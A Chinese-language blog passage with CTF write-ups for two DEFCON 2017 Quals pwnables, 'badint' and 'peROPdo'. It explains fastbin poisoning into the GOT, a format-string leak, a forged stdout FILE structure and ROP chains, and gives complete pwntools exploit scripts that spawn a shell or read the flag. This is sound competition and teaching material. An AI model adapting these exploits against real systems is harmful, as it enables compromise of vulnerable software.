<p>強大的 <a target="_blank" rel="noopener" href="https://github.com/scwuaptx/Pwngdb/tree/master/angelheap">angelheap</a> 告訴我們在 fastbin[2] (size &#x3D; 0x40) 與 fastbin[4] (size &#x3D; 0x60) 各有一個 freed chunk。我們首先 allocate fastbin[4] 裡頭的 chunk，並將 data 複製進裡面，offset 設成 <code>0x60</code>。這麼一來，<code>0xc26c20</code> + <code>0x60</code> &#x3D; <code>0xc62c80</code> &#x3D; chunk @ fastbin[2]，我們就可以控制到 fastbin[2] 裡頭的 chunk 的 data。我們主要的目的是要將其 <code>fd</code> 改掉，指向 GOT :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ got</span><br><span class="line">State of the GOT table</span><br><span class="line"></span><br><span class="line">RELRO: Partial</span><br><span class="line"></span><br><span class="line">[1] printf@GLIBC_2.2.5 -&gt; 0x00007ffff72c7800</span><br><span class="line">[2] __gmon_start__ -&gt; 0x0000000000400ab6</span><br><span class="line">[3] puts@GLIBC_2.2.5 -&gt; 0x0000000000400ac6</span><br><span class="line">[4] _Znam@GLIBCXX_3.4 -&gt; 0x0000000000400ad6</span><br><span class="line">[5] _ZdlPv@GLIBCXX_3.4 -&gt; 0x0000000000400ae6</span><br><span class="line">[6] setvbuf@GLIBC_2.2.5 -&gt; 0x00007ffff72e1e70</span><br><span class="line">..................</span><br></pre></td></tr></table></figure>
<p>我們可以看到，一個 non-PIE 的 x64 ELF 的 GOT 裡頭，有許多開頭為 <code>0x40</code> 的 address。如果我們將 memory layout 進行偏移:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x604042</span><br><span class="line">0x604042 &lt;setvbuf@got.plt+2&gt;:   0x0b0600007ffff72e      0x2740000000000040 &lt;-- here</span><br><span class="line">0x604052 &lt;__libc_start_main@got.plt+2&gt;: 0xfad000007ffff729      0x0b3600007ffff72d</span><br><span class="line">0x604062 &lt;strlen@got.plt+2&gt;:    0x0b46000000000040      0x73c0000000000040 &lt;-- here</span><br><span class="line">0x604072 &lt;signal@got.plt+2&gt;:    0x0b6600007ffff72a      0xd650000000000040 &lt;-- here</span><br><span class="line">0x604082 &lt;alarm@got.plt+2&gt;:     0x0b8600007ffff733      0x0b96000000000040 &lt;-- here</span><br></pre></td></tr></table></figure>
<p>我們會發現到有許多地方是可以拿來當作假的 fastbin[2] chunk (size &#x3D; 0x40) 來用的。因此，如果我們將 fastbin[2] 裡面的 <code>chunk-&gt;fd</code> 寫成 <code>0x604042</code> 的話:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ hip</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x1da3cc0 --&gt; 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x1da3c80 --&gt; 0x604042 (size error (0xc740000000000040)) --&gt; 0x9ad000007f5e059a (invaild memory)</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x1da3c20 --&gt; 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">                  top: 0x1da3f80 (size : 0x1c080) </span><br><span class="line">       last_remainder: 0x1da3e00 (size : 0x50) </span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>
<p>我們可以發現到， fastbin[2] 裡頭多出了一個假的 fastbin[2] chunk <code>0x604042</code>。之後我們就可以把這個 fake chunk 拿來用，將 data 複製進這個 chunk 裡面，做 GOT hijacking。</p>
<blockquote>
<p>malloc.c 裡面針對 fastbin 的檢查很殘廢。對於 malloc 一個 fastbin[2] 而言，只要其 size (unsigned int, 4 個 byte) 為 0x40 ~ 0x4f，就可以通過 malloc() 的檢查，allocate 成功。</p>
</blockquote>
<p>雖然目前可以 hijack GOT 了，但是我們還不知道 libc 的版本為何。這題不好 leak address，因為我們參數幾乎都是不可控的狀態 (頂多就是可以控制 buffer 內容，但是無法控制 buffer 位址)。這邊最後想到了一個有趣的解法: <strong>利用 format string</strong>。</p>
<p>我們可以將 <code>atol()</code> hijack 成 <code>printf()</code>，之後程式在呼叫 <code>atol(input)</code>的時候，實際上就是在執行 <code>printf(input)</code>，我們就可以透過 format string 漏洞 leak 任意位址。</p>
<p>另外再分享一個小技巧，就是我們在蓋 <code>atol()</code> 的 GOT 時，會無可避免地蓋到 <code>fgets()</code> 的 GOT。此時在不知道 <code>fgets()</code> 的 function address 的情況下，我們可以將 <code>fgets()</code> 的 GOT 蓋成  <code>fgets()</code> 被 resolve 之前的 code address:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ got</span><br><span class="line">State of the GOT table</span><br><span class="line"></span><br><span class="line">RELRO: Partial</span><br><span class="line">...................</span><br><span class="line">[9] fgets@GLIBC_2.2.5 -&gt; 0x0000000000400b26 &lt;-- a fixed address</span><br></pre></td></tr></table></figure>
<p>這麼一來程式之後就會重新 bind 一次 <code>fgets()</code> 的 address，我們就可以繼續利用 <code>fgets()</code> 讀 input 了。</p>
<p>利用 format string leak 出各個 GOT entry 之後，順利的在 <a target="_blank" rel="noopener" href="http://libcdb.com/">libcdb.com</a> 找到了遠端 libc 的版本。之後我們就可以將 <code>atol()</code> hijack 成 <code>system()</code>，然後輸入 “sh” 字串，呼叫 <code>system(&quot;sh&quot;)</code> 拿 shell。</p>
<figure class="highlight python"><figcaption><span>exp_bad.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me&quot;</span></span><br><span class="line">PORT = <span class="number">21813</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./badint&quot;</span></span><br><span class="line"><span class="comment">#LIBC_PATH = &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;./libc-2.19_15.so&quot;</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span> <span class="comment"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_data</span>(<span class="params">seq, off, data, lsf</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;SEQ #:&quot;</span>, <span class="built_in">str</span>(seq))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Offset: &quot;</span>, <span class="built_in">str</span>(off))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Data: &quot;</span>, data)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Yes/No: &quot;</span>, lsf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">num</span>):</span><br><span class="line">    ret = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">        now = num &amp; <span class="number">0xff</span></span><br><span class="line">        num &gt;&gt;= <span class="number">8</span></span><br><span class="line">        ret = ret + <span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(now)</span><br><span class="line">    <span class="keyword">return</span> ret.ljust(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    add_data(<span class="number">1</span>, <span class="number">8</span>, <span class="string">&quot;1&quot;</span>*<span class="number">0x90</span>*<span class="number">2</span>, <span class="string">&#x27;Yes&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Assembled [seq: 1]: &quot;</span>)</span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>):</span><br><span class="line">        addr |= ((<span class="built_in">int</span>(r.recv(<span class="number">2</span>), <span class="number">16</span>)) &lt;&lt; (i*<span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">&quot;addr: &quot;</span> +<span class="built_in">hex</span>(addr))</span><br><span class="line">    <span class="comment"># libc.address = addr - 0x3c3b78 # local</span></span><br><span class="line">    libc.address = addr - <span class="number">0x3be7b8</span> <span class="comment"># remote</span></span><br><span class="line">    log.success(<span class="string">&quot;libc_base: &quot;</span> +<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    <span class="comment"># gdb.attach(r, gdbscript=open(&#x27;./ggg&#x27;, &#x27;r&#x27;))</span></span><br><span class="line">    <span class="comment"># arrange heap</span></span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&quot;2&quot;</span>*<span class="number">0xb0</span>*<span class="number">2</span>, <span class="string">&#x27;Yes&#x27;</span>)</span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&quot;3&quot;</span>*<span class="number">0x58</span>*<span class="number">2</span>, <span class="string">&#x27;Yes&#x27;</span>)</span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&quot;4&quot;</span>*<span class="number">0x38</span>*<span class="number">2</span>, <span class="string">&#x27;Yes&#x27;</span>)</span><br><span class="line">    <span class="comment"># overwrite fastbin-&gt;fd ( in size 0x40 )</span></span><br><span class="line">    payload = convert(<span class="number">0x41</span>)</span><br><span class="line">    payload += convert(<span class="number">0x604042</span>)</span><br><span class="line">    payload += convert(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">    payload += convert(<span class="number">0x31</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x58</span>*<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0x60</span>-<span class="number">0x8</span>, payload, <span class="string">&#x27;Yes&#x27;</span>)</span><br><span class="line">    <span class="comment"># now fastbin (size=0x40) has fake chunk @ got</span></span><br><span class="line">    <span class="comment"># allocate the fake chunk</span></span><br><span class="line">    <span class="comment"># overwrite got</span></span><br><span class="line">    payload = <span class="string">&quot;6&quot;</span>*<span class="number">12</span> <span class="comment"># libc_start_main</span></span><br><span class="line">    payload += convert(<span class="number">0x400b26</span>) <span class="comment"># resolve fgets</span></span><br><span class="line">    payload += convert(<span class="number">0x400b36</span>) <span class="comment"># resolve strlen</span></span><br><span class="line">    payload += convert(libc.symbols[<span class="string">&#x27;system&#x27;</span>]) <span class="comment"># hijack atol</span></span><br><span class="line">    <span class="comment">#payload += convert(elf.plt[&#x27;printf&#x27;]) # use format string to leak libc info</span></span><br><span class="line">    payload = payload.ljust(<span class="number">110</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    add_data(<span class="number">3</span>, <span class="number">8</span>, payload, <span class="string">&#x27;No&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># hijack atol, send &quot;sh&quot; to get shell</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;SEQ #:&quot;</span>, <span class="string">&quot;sh&quot;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;get shell!: &quot;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for exploiting format string &amp; leak libc info</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    payload = &quot;%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot; + p64(elf.got[&#x27;fgets&#x27;])</span></span><br><span class="line"><span class="string">    r.sendlineafter(&quot;SEQ #:&quot;, payload)</span></span><br><span class="line"><span class="string">    r.recv(1)</span></span><br><span class="line"><span class="string">    print &quot;fgets:&quot;, hex(u64(r.recv(6).ljust(8, &#x27;\x00&#x27;)))</span></span><br><span class="line"><span class="string">    payload = &quot;%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot; + p64(elf.got[&#x27;puts&#x27;])</span></span><br><span class="line"><span class="string">    r.sendlineafter(&quot;Offset:&quot;, payload)</span></span><br><span class="line"><span class="string">    r.recv(1)</span></span><br><span class="line"><span class="string">    print &quot;puts:&quot;, hex(u64(r.recv(6).ljust(8, &#x27;\x00&#x27;)))</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>flag: <code>All ints are not the same... A239... Some can be bad ints!</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/DEFCON-CTF-2017-Quals-peROPdo/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/DEFCON-CTF-2017-Quals-peROPdo/" itemprop="url">[DEFCON CTF 2017 Quals] peROPdo</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-03T15:31:00+00:00">
                2017-05-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: Potent Pwnables<br>Author: bruce30262 @ BambooFox  </p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, <strong>static linked &amp; stripped</strong>, 有開 DEP 保護</p>
<p>程式是個簡單的骰子程式，輸入完名字後程式會問你要骰幾個骰子，輸入一個正整數後，程式會隨機產生資料，存在 <code>data[i]</code> 裡面。之後程式會輸出 <code>data[i] % 6 + 1</code>，代表這一輪我們骰的數字。</p>
<p>這題有兩個漏洞:</p>
<ol>
<li>輸入名字時是用 <code>scanf(&quot;%s&quot;, name);</code> 的方式讀取，造成 <code>name</code> buffer 有 overflow 的情形 (<code>name</code>位於 data 段)  </li>
<li>程式存資料 <code>data[i]</code> 是存在 stack 上，因此如果我們骰太多骰子的話，會造成 <code>data[i]</code> 的資料覆蓋到 return address ( stack overflow )。</li>
</ol>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>一開始本來打算利用第二個漏洞 ( stack overflow ) 來做 exploit，不過因為 <code>data[i]</code> 的資料是隨機化的結果，我們沒辦法隨心所欲的控制 return address 的內容。</p>
<p>這邊在解題時犯了一個錯誤: <strong>誤認為程式所用的隨機化函式是自行 implement 的函式</strong>。因為 binary 被 stripped 掉的關係，加上是 static linked 的 binary，因此當時無法判斷哪些是自行 implement 的 function，哪些是 libc 內部的 function。也因為這樣，在這題浪費了大量的時間在搞 symbolic execution tool，想說可以利用這些工具來幫助我們解出想要的 return address。結果 <a target="_blank" rel="noopener" href="http://angr.io/">angr</a> 不會用，<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/Triton">Triton</a> 跟 <a target="_blank" rel="noopener" href="https://github.com/trailofbits/manticore">manticore</a> 則是連跑都跑不起來，一整個慘…… </p>
<p>後來就想說換個方向，試試看第一個漏洞 ( <code>name</code> 的 buffer overflow )。結果發現到說可以控到 EIP，似乎是因為在 <code>name</code> buffer 的後面存有一些 <code>FILE*</code> pointer，導致我們可以透過<a target="_blank" rel="noopener" href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">偽造<code>FILE</code></a>結構來達到 hijack control flow 的效果。</p>
<p>於是透過一些動態分析，我們發現說我們可以透過一個 <code>call [reg+offset]</code> 的 gadget 來控制 EIP，且第二個參數會是 <code>stdout</code>。於是我先將程式跳至 main function 的中間:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [esp+4], offset name</span><br><span class="line">mov     dword ptr [esp], (offset aSSSS+8) ; &quot;%s&quot; &lt;--- 跳到這裡</span><br><span class="line">call    scanf</span><br><span class="line">mov     eax, ds:name</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    sub_0804baf0</span><br><span class="line">mov     dword ptr [esp], offset name</span><br><span class="line">call    do_main</span><br></pre></td></tr></table></figure>

<p>會這樣跳是因為接下來程式會將 <code>%s</code> 放到第一個參數，並且呼叫 <code>scanf()</code>，讓程式執行 <code>scanf(&quot;%s&quot;, stdout)</code>，我們就可以完整的控制 <code>stdout</code> 的內容，之後就可以做更進一步的 ROP attack  </p>
<p>以下是我最後的 ROP chain:</p>
<ul>
<li>先用 <code>xchg esp, eax</code> 將 stack migrate 至 <code>stdout</code> (此時 stdout 內容可控)</li>
<li>利用 <code>add esp, offset</code> gadget 跳過 <code>stdout</code> 結構 ( 必須跳過一些我們偽造的 data )</li>
<li>利用 gadgets 作出 open&#x2F;read&#x2F;write 的 syscall，將 flag 吐出來 ( 這題有擋 <code>execve()</code> )</li>
</ul>
<p>Final exploit:</p>
<figure class="highlight python"><figcaption><span>exp_peropdo.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me&quot;</span></span><br><span class="line">PORT = <span class="number">80</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./peropdo&quot;</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span> <span class="comment"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(r, gdbscript=open(&quot;./ggg&quot;, &quot;r&quot;))</span></span><br><span class="line">    func = <span class="number">0x0806d7aa</span> <span class="comment"># avoid crash</span></span><br><span class="line">    scanf = <span class="number">0x08048b2a</span></span><br><span class="line">    name = p32(scanf) + p32(func) + <span class="string">&quot;\x42&quot;</span>*<span class="number">972</span> + p32(<span class="number">0x80ecdf4</span>) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">92</span>  + p32(<span class="number">0x80ecdf8</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;name?&quot;</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Later the program will call scanf(&quot;%s&quot;, stdout);</span></span><br><span class="line">    <span class="comment"># now we can overwrite the whole stdout FILE structure</span></span><br><span class="line"></span><br><span class="line">    stream = p32(<span class="number">0x08079824</span>) <span class="comment"># second gadget: add esp, 0x84....</span></span><br><span class="line">    stream += <span class="string">&quot;/home/peropdo/flag\x00&quot;</span> <span class="comment"># flag path</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x1c</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    stream += p32(<span class="number">0x804b45c</span>) <span class="comment"># eip, first gadget: xchg esp, eax ; ret</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x48</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    stream += p32(<span class="number">0x080ED3E8</span>) <span class="comment"># pointer to null</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    stream += p32(<span class="number">0x807982b</span>) <span class="comment"># third gadget: pop; ret</span></span><br><span class="line">    stream += p32(<span class="number">0x80eb2a0</span>) <span class="comment"># fake jump table</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret </span></span><br><span class="line">    <span class="comment"># 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">    pop_ebx = <span class="number">0x806f322</span>  <span class="comment"># pop ebx;ret</span></span><br><span class="line">    pop_eax = <span class="number">0x80e3525</span>  <span class="comment"># pop eax;ret</span></span><br><span class="line">    pop_ecx = <span class="number">0x080e5ee1</span> <span class="comment"># pop ecx ; ret </span></span><br><span class="line">    pop_edx = <span class="number">0x0806f2fa</span> <span class="comment"># pop edx ; ret</span></span><br><span class="line">    int80 = <span class="number">0x806fae0</span>    <span class="comment"># int 0x80 ; ret </span></span><br><span class="line">    buf = <span class="number">0x80ed000</span>-<span class="number">0x100</span></span><br><span class="line">    rop = flat(</span><br><span class="line">                pop_ecx,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                pop_edx, </span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">0x08074f2e</span>, <span class="comment"># mov eax = 5 (open), pop ebx...</span></span><br><span class="line">                <span class="number">0x80eb2a4</span>, <span class="comment"># ptr to flag path</span></span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                int80,              </span><br><span class="line">                pop_eax,</span><br><span class="line">                <span class="number">3</span>, <span class="comment"># read</span></span><br><span class="line">                pop_ebx,</span><br><span class="line">                <span class="number">3</span>, <span class="comment">#fd</span></span><br><span class="line">                pop_ecx,</span><br><span class="line">                buf,</span><br><span class="line">                pop_edx,</span><br><span class="line">                <span class="number">0x100</span>,</span><br><span class="line">                int80,</span><br><span class="line">                pop_ebx,</span><br><span class="line">                <span class="number">1</span>, <span class="comment"># fd,</span></span><br><span class="line">                pop_eax,</span><br><span class="line">                <span class="number">4</span>, <span class="comment"># write</span></span><br><span class="line">                int80</span><br><span class="line">              )</span><br><span class="line"></span><br><span class="line">    r.sendline(stream + rop)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<p>flag: <code>Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code></p>
